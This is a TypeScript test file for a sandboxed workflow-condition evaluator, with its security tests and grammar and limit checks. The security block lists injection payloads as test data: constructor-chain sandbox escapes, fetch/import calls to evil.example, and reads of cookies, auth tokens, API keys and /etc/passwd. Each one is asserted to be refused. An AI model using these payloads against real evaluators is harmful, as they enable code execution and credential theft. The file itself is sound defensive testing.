import { beforeEach, describe, expect, it, vi } from 'vitest';
import {
  EXPRESSION_LIMITS,
  __clearExpressionCache,
  compileCondition,
  evaluateCondition,
  evaluateConditionDetailed,
  normalizeExpression,
  validateCondition,
} from '../safeExpression';

/**
 * The security tests here are the point of this module. Conditions arrive from
 * shared server storage, so the old `new Function` implementation meant a stored
 * condition was arbitrary JavaScript running in the browser.
 */

beforeEach(() => {
  __clearExpressionCache();
  vi.spyOn(console, 'warn').mockImplementation(() => {});
});

describe('security: host access is unreachable', () => {
  const payloads = [
    // The canonical sandbox escape: reach Function via a constructor chain.
    "constructor.constructor('return 1+1')()",
    "x.constructor.constructor('return process')()",
    // Direct attempts at host capabilities.
    'fetch("https://evil.example")',
    'window.location = "https://evil.example"',
    'localStorage.getItem("tool_auth_gmail")',
    'document.cookie',
    'process.env.OPENROUTER_API_KEY',
    'require("fs").readFileSync("/etc/passwd")',
    'globalThis.fetch',
    'import("http://evil.example")',
    // Prototype reachability.
    '__proto__.polluted',
    'x.__proto__',
    '[].constructor',
    // Statement injection, which the old string-concatenation approach allowed.
    '1); fetch("https://evil.example"); (1',
    'true; window.stolen = 1',
  ];

  it.each(payloads)('refuses to evaluate: %s', (payload) => {
    const outcome = evaluateConditionDetailed(payload, { x: {}, sentiment: 'positive' });

    // Fails closed: the branch is not taken and the reason is reported.
    expect(outcome.value).toBe(false);
    expect(outcome.error).toBeTruthy();
  });

  it('reports member access as a compile error, not a silent false', () => {
    const result = compileCondition('a.b == 1');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/member access is not permitted/i);
  });

  it('cannot assign to state', () => {
    // Assignment is disabled, so this must not parse.
    const result = compileCondition('approved = true');
    expect(result.ok).toBe(false);
  });

  it('cannot define a function', () => {
    const result = compileCondition('f(x) = x + 1');
    expect(result.ok).toBe(false);
  });

  it('cannot use randomness, which would break deterministic replay', () => {
    // `random()` still parses — it looks like a call on an unknown name — but the
    // function is not registered, so it can never produce a value. The guarantee
    // that matters is that it cannot succeed.
    const outcome = evaluateConditionDetailed('random() > 0.5', {});
    expect(outcome.value).toBe(false);
    expect(outcome.error).toBeTruthy();
  });

  it('cannot call any unregistered function', () => {
    for (const expr of ['map(x, y)', 'filter(a, b)', 'fold(a, b, c)', 'sin(x)', 'sqrt(x)']) {
      const outcome = evaluateConditionDetailed(expr, { x: 1, y: 2, a: 1, b: 2, c: 3 });
      expect(outcome.value).toBe(false);
      expect(outcome.error).toBeTruthy();
    }
  });

  it('does not expose state keys the condition never named', () => {
    // Only referenced variables enter scope, so an unrelated secret-ish key
    // cannot be read even indirectly.
    const outcome = evaluateConditionDetailed('score > 1', {
      score: 5,
      access_token: 'super-secret',
    });
    expect(outcome.value).toBe(true);
    expect(outcome.error).toBeUndefined();
  });
});

describe('normalizeExpression', () => {
  it('rewrites JavaScript comparison operators', () => {
    expect(normalizeExpression("a === 'x'")).toBe("a == 'x'");
    expect(normalizeExpression("a !== 'x'")).toBe("a != 'x'");
  });

  it('rewrites && and || into the supported keywords', () => {
    // `&&` does not tokenise here, and `||` would mean string concatenation.
    expect(normalizeExpression('a > 1 && b < 2')).toBe('a > 1 and b < 2');
    expect(normalizeExpression('a > 1 || b < 2')).toBe('a > 1 or b < 2');
  });

  it('rewrites a lone ! into not, leaving != alone', () => {
    // In this grammar `!` would be factorial, not negation.
    expect(normalizeExpression('!done')).toBe('not done');
    expect(normalizeExpression('a != 1')).toBe('a != 1');
  });

  it('never rewrites operators inside string literals', () => {
    expect(normalizeExpression('label == "a && b"')).toBe('label == "a && b"');
    expect(normalizeExpression("label == 'x === y'")).toBe("label == 'x === y'");
    expect(normalizeExpression('label == "100% || done"')).toBe('label == "100% || done"');
  });

  it('handles escaped quotes inside literals', () => {
    expect(normalizeExpression('a == "he said \\"hi && bye\\""')).toBe(
      'a == "he said \\"hi && bye\\""',
    );
  });
});

describe('real conditions evaluate correctly', () => {
  const cases: Array<[string, Record<string, unknown>, boolean]> = [
    // JS-style syntax from existing saved workflows.
    ["sentiment === 'positive'", { sentiment: 'positive' }, true],
    ["sentiment === 'positive'", { sentiment: 'negative' }, false],
    ["sentiment !== 'positive'", { sentiment: 'negative' }, true],
    ['score > 50', { score: 80 }, true],
    ['score > 50', { score: 20 }, false],
    ['score >= 50 && score <= 100', { score: 80 }, true],
    ['score >= 50 && score <= 100', { score: 120 }, false],
    ["status == 'ok' || retries > 3", { status: 'bad', retries: 5 }, true],
    ["status == 'ok' || retries > 3", { status: 'bad', retries: 1 }, false],
    // Native grammar keywords still work.
    ['score > 50 and score < 100', { score: 70 }, true],
    ['not approved', { approved: false }, true],
    ['!approved', { approved: false }, true],
    ['approved', { approved: true }, true],
    ['approved', { approved: false }, false],
    // Truthiness coercion.
    ['summary', { summary: 'some text' }, true],
    ['summary', { summary: '' }, false],
    ['count', { count: 0 }, false],
    ['count', { count: 3 }, true],
  ];

  it.each(cases)('%s', (condition, state, expected) => {
    expect(evaluateCondition(condition, state)).toBe(expected);
  });

  it('supports parentheses and mixed logic', () => {
    expect(
      evaluateCondition("(score > 50 && tier === 'gold') || override === true", {
        score: 10,
        tier: 'silver',
        override: true,
      }),
    ).toBe(true);
  });

  it('supports arithmetic in comparisons', () => {
    expect(evaluateCondition('total / count > 10', { total: 100, count: 5 })).toBe(true);
  });
});

describe('unconditional edges', () => {
  it.each([undefined, null, '', '   '])('treats %s as always true', (value) => {
    expect(evaluateCondition(value as string | undefined, {})).toBe(true);
  });

  it('reports no error for an absent condition', () => {
    expect(evaluateConditionDetailed(undefined, {}).error).toBeUndefined();
  });
});

describe('missing state keys', () => {
  it('treats a missing key as null instead of aborting the run', () => {
    // expr-eval throws on an undefined variable; a missing key must make the
    // condition false, not break execution.
    const outcome = evaluateConditionDetailed('missing_key == 1', {});
    expect(outcome.value).toBe(false);
    expect(outcome.error).toBeUndefined();
  });

  it('a missing key compared for inequality is still decidable', () => {
    expect(evaluateCondition('missing_key != 1', {})).toBe(true);
  });

  it('does not expose run metadata to conditions', () => {
    const outcome = evaluateConditionDetailed('__metadata == null', {
      __metadata: { runId: 'abc', status: 'running' },
    });
    expect(outcome.value).toBe(true);
  });
});

describe('fails closed', () => {
  it('returns false for a syntactically invalid condition', () => {
    const outcome = evaluateConditionDetailed('score >', { score: 1 });
    expect(outcome.value).toBe(false);
    expect(outcome.error).toMatch(/could not be parsed/i);
  });

  it('returns false for unbalanced parentheses with a clear message', () => {
    const outcome = evaluateConditionDetailed('(score > 1', { score: 5 });
    expect(outcome.value).toBe(false);
    expect(outcome.error).toMatch(/unbalanced/i);
  });
});

describe('complexity limits', () => {
  it('rejects an over-long condition', () => {
    const long = `${'a'.repeat(EXPRESSION_LIMITS.maxLength + 1)} > 1`;
    const result = compileCondition(long);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/too long/i);
  });

  it('rejects excessive nesting', () => {
    const deep = `${'('.repeat(EXPRESSION_LIMITS.maxDepth + 2)}1${')'.repeat(EXPRESSION_LIMITS.maxDepth + 2)} > 0`;
    const result = compileCondition(deep);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/nests too deeply/i);
  });

  it('rejects too many operators', () => {
    // Kept short per term so the length limit is not what trips first: n terms
    // joined by `and` yields 2n-1 operators.
    const terms = Math.ceil((EXPRESSION_LIMITS.maxOperators + 5) / 2);
    const many = Array.from({ length: terms }, () => 'a>1').join(' and ');
    expect(many.length).toBeLessThanOrEqual(EXPRESSION_LIMITS.maxLength);

    const result = compileCondition(many);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/too many operators/i);
  });

  it('rejects too many referenced state keys', () => {
    const vars = Array.from({ length: EXPRESSION_LIMITS.maxVariables + 3 }, (_, i) => `k${i}`);
    // Keep the operator count low so the variable limit is what trips.
    const expr = vars.join(' + ');
    const result = compileCondition(`${expr} > 0`);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/too many state keys/i);
  });
});

describe('authoring-time validation', () => {
  it('accepts a valid condition', () => {
    expect(validateCondition("sentiment === 'positive'")).toBeNull();
  });

  it('accepts an empty condition as an unconditional edge', () => {
    expect(validateCondition('')).toBeNull();
    expect(validateCondition(undefined as unknown as string)).toBeNull();
  });

  it('returns a message an editor can display for a bad condition', () => {
    const error = validateCondition('score >');
    expect(error).toBeTruthy();
    expect(error).toMatch(/could not be parsed/i);
  });

  it('rejects an injection payload at authoring time, before any run', () => {
    expect(validateCondition("constructor.constructor('return 1')()")).toBeTruthy();
  });
});

describe('compilation details', () => {
  it('reports the referenced variables', () => {
    const result = compileCondition("score > 50 && tier === 'gold'");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.variables.sort()).toEqual(['score', 'tier']);
  });

  it('exposes the normalised form for debugging', () => {
    const result = compileCondition("a === 'x'");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.normalized).toContain('==');
  });

  it('caches compilation so repeated evaluation does not reparse', () => {
    const first = compileCondition('score > 1');
    const second = compileCondition('score > 1');
    expect(second).toBe(first);
  });
});
